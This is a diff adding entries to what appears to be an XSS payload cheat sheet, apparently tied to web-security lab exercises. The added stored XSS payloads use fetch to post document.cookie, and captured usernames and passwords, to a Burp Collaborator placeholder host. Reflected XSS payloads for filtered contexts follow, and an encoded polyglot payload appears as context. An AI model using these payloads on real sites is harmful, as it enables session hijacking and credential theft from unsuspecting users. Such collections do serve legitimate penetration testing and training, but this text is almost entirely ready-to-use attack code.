@@ -7,6 +7,25 @@ https://xsshunter.com/
 `
 amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoJ1RITScpLy8+XHgzZQ==
 `
+### Stored XSS
+#### Steal cookie
+`<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>`
+
+#### Capture other users information
+`<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">`
+
+### Reflected XSS
 #### Reflected XSS into attribute with angle brackets HTML-encoded
 
 `"onmouseover="alert(1)`
@@ -17,11 +36,19 @@ amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkv
 
 #### Reflected XSS into HTML context with most tags and attributes blocked
 
-`<$tag$ $attribute> Using Burp Suite Intruder`
+`<$tag$ $attribute$> Using Burp Suite Intruder`
 
 #### Reflected XSS into a JavaScript string with single quote and backslash escaped
 
 `</script><script>alert(1)</script>`
+
+#### Reflected XSS with some SVG markup allowed
+
+`<svg><animatetransform onbegin=alert(1)>`
+
+#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+`\'-alert(1)//`
 
 # RFI
 ### Shell generation
